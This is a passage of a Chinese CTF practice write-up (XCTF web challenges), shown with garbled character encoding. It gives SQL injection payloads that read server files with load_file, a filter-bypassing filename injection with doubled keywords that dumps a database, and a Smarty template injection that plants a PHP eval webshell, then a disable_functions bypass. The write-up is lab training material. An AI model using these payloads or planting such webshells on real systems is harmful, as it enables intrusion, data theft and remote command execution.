</div><p>è¿™é‡Œå¯ä»¥çœ‹å‡ºtmp/ç›®å½•ä¸‹æœ‰æœªåˆ é™¤çš„.DS_Store,ç„¶å/var/www/html/æœ‰é™¤äº†.DS_Storeçš„å…¶ä»–æ–‡ä»¶</p>
<p>æŸ¥çœ‹.DS_Storeï¼Œç”¨16è¿›åˆ¶æŸ¥çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(hex(load_file(&#34;/tmp/html/.DS_Store&#34;))))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067.png"
	width="596"
	height="115"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067_hu11188161322271617712.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067_hu8288258581639992285.png 1024w"
	loading="lazy"
	
		alt="image-20250203163034067"
	
	
		class="gallery-image" 
		data-flex-grow="518"
		data-flex-basis="1243px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°flagä¸ºflag_8946e1ff1ee3e40f.php</p>
<p>å»/var/www/html/æŸ¥çœ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(hex(load_file(&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;))))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034.png"
	width="1310"
	height="414"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034_hu10965312942498880607.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034_hu7050646833906484831.png 1024w"
	loading="lazy"
	
		alt="image-20250203163211034"
	
	
		class="gallery-image" 
		data-flex-grow="316"
		data-flex-basis="759px"
	
></p>
<h2 id="upload">upload
</h2><p>ä¸Šæ¥ç™»å…¥ç•Œé¢ä¸å­˜åœ¨æ³¨å…¥</p>
<p>ç™»å…¥å®Œæ˜¯æ–‡ä»¶ä¸Šä¼ </p>
<p>è¯•ç€ä¼ phpå’Œtxtéƒ½é”™äº†</p>
<p>çŒœæµ‹åªèƒ½ä¼ å›¾ç‰‡</p>
<p>bpæŠ“åŒ…æ”¹åç¼€åï¼Œä¸Šä¼ æˆåŠŸä½†æ˜¯æ²¡æ˜¾ç¤ºè·¯å¾„åï¼Œä½†æ˜¯å›æ˜¾æ–‡ä»¶å</p>
<p>çŒœæµ‹æ˜¯æ–‡ä»¶åæ³¨å…¥ï¼Œfuzzæµ‹è¯•</p>
<p>select,fromè¢«è¿‡æ»¤äº†</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161.png"
	width="976"
	height="579"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161_hu17442616422686319252.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161_hu4217430156081430533.png 1024w"
	loading="lazy"
	
		alt="image-20250205123232161"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<p>è€Œä¸”æ˜¯è¢«åˆ é™¤çš„ï¼ŒåŒå†™ç»•è¿‡</p>
<p>æ¥ç€å°±æ˜¯sqlæ³¨å…¥</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg
</span></span><span class="line"><span class="cl">hex(xxx)ã€€ã€€æŠŠå–åˆ°çš„æ•°æ®è¿›è¡Œåå…­è¿›åˆ¶åŠ å¯†ï¼Œé˜²æ­¢è¿‡æ»¤å­—ç¬¦ï¼Œä¸ç»™å›æ˜¾ï¼›
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">substr(xxx,1,12)ã€€ã€€æŠŠå–åˆ°çš„æ•°æ®ï¼Œæˆªå–ä¸€éƒ¨åˆ†æ‹¿å‡ºæ¥ï¼Œå…ˆæ‹¿12ä¸ªï¼Œé˜²æ­¢é•¿åº¦é™åˆ¶ä¸ç»™å›æ˜¾ï¼›åé¢æ¯æ¬¡æ‹¿12ä¸ªï¼›å¦‚ 13,12ã€€ã€€25,12
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">selecselectt = select æŸ¥è¯¢è¯­å¥
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">conv(xxx,16,10)    æŠŠ åå…­è¿›åˆ¶ è½¬æ¢ä¸º åè¿›åˆ¶     //ä¸ºä»€ä¹ˆï¼Œå®ƒè¿‡æ»¤å›æ˜¾ ï¼Œåå…­è¿›åˆ¶å†…è‹¥å­˜åœ¨å­—ç¬¦ ï¼Œé‚£ä¹ˆå­—ç¬¦ä¹‹åçš„æ•°æ®å°±è¢«å¹²æ‰äº†ï¼›
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286.png"
	width="190"
	height="58"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286_hu8306769009463674334.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286_hu15758103007721521138.png 1024w"
	loading="lazy"
	
		alt="image-20250205124212286"
	
	
		class="gallery-image" 
		data-flex-grow="327"
		data-flex-basis="786px"
	
></p>
<p>å‡ºç°10è¿›åˆ¶å›æ˜¾ï¼Œå…ˆè½¬å›16è¿›åˆ¶ï¼Œå†è½¬asciiç </p>
<p>web_up</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049.png"
	width="327"
	height="134"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049_hu12861158772067014110.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049_hu14255848589864369363.png 1024w"
	loading="lazy"
	
		alt="image-20250205124435049"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="585px"
	
></p>
<p>è¯´æ˜å¯è¡Œï¼Œæˆ‘ä»¬ç»§ç»­æ³¨å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selecselectt conv(substr(hex(database()),13,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>load</p>
<p>æ•°æ®åº“åæ˜¯web_upload</p>
<p>æ¥ç€çˆ†è¡¨å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),1,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),13,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),25,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>hello_flag_is_here</p>
<p>æ¥ç€çˆ†åˆ—å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=&#39;hello_flag_is_here&#39; limit 0,1)),13,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>i_am_flag</p>
<p>çˆ†å­—æ®µ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>!!_@m_Th.e_F!lag</p>
<h2 id="smarty">smarty
</h2><p>çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“æ˜¯smartyæ³¨å…¥</p>
<p>å¯ä»¥çœ‹çœ‹xffå¤´</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220.png"
	width="1760"
	height="445"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220_hu13103961707436879697.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220_hu13824834540604378622.png 1024w"
	loading="lazy"
	
		alt="image-20250205133820220"
	
	
		class="gallery-image" 
		data-flex-grow="395"
		data-flex-basis="949px"
	
></p>
<p>ä½¿ç”¨{if}æ ‡ç­¾å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="k">if</span> <span class="n">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;?php eval($_POST[cmd]);&#39;</span><span class="p">)}{</span><span class="o">/</span><span class="k">if</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>èšå‰‘è¿æ¥</p>
<p>ç›´æ¥urlåæ¥shell.phpå°±è¡Œ</p>
<p>è¿™é‡Œä¸è®©è®¿é—®ä¸Šå±‚ç›®å½•ï¼Œä¸è®©ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œphpinfoå‘ç°ç¦ç”¨å¾ˆå¤šå‡½æ•°</p>
<p>çœ‹å¸ˆå‚…ä»¬éƒ½æ˜¯ç”¨çš„<a class="link" href="https://www.freebuf.com/articles/web/192052.html"  target="_blank" rel="noopener"
    >æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p>æˆ‘ä»¬ç”¨èšå‰‘æ’ä»¶è§£å†³</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431.png"
	width="1284"
	height="870"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431_hu4921648551992235502.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431_hu5673024783264311967.png 1024w"
	loading="lazy"
	
		alt="image-20250205135056431"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p>å³é”®å‰ä¸‹è¿æ¥æˆåŠŸçš„ç½‘ç«™ï¼ŒåŠ è½½æ’ä»¶</p>
<p>ç„¶åé€‰ä¸Šé¢è¿™ä¸ªæ¨¡å¼</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021.png"
	width="1284"
	height="870"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021_hu16849136199669563293.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021_hu4495495286677216067.png 1024w"
	loading="lazy"
	
		alt="image-20250205135213021"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<h2 id="ics-02">ics-02
</h2>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%88%B7%E9%A2%98/">åˆ·é¢˜</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/buuctf%E5%88%B7%E9%A2%98/">
        
        
            <div class="article-image">
                <img src="/p/buuctf%E5%88%B7%E9%A2%98/1.9cee2f631ea8b1b22f42f7b318775325.webp" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post buuctfåˆ·é¢˜"
                        
                        data-hash="md5-nO4vYx6osbIvQvezGHdTJQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">buuctfåˆ·é¢˜</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/7.10bugkuawd/">
        
        
            <div class="article-image">
                <img src="/p/7.10bugkuawd/1.9cee2f631ea8b1b22f42f7b318775325.webp" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post 7.10bugkuawd"
                        
                        data-hash="md5-nO4vYx6osbIvQvezGHdTJQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">7.10bugkuawd</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.36b7be2aa84abef312bd7b8ca3fd18f0.png" 
                        width="1216" 
                        height="832" 
                        loading="lazy"
                        alt="Featured image of post ç„æœºæ‰“é¶æ—¥è®°"
                        
                        data-hash="md5-Nre&#43;KqhKvvMSvXuMo/0Y8A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç„æœºæ‰“é¶æ—¥è®°</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.9349c37f2956be9c3933760456845267.webp" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post thmæ—¥è®°"
                        
                        data-hash="md5-k0nDfylWvpw5M3YEVoRSZw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">thmæ—¥è®°</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 æ— æ•Œå¯çˆ±ç¾å’•å™œ
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
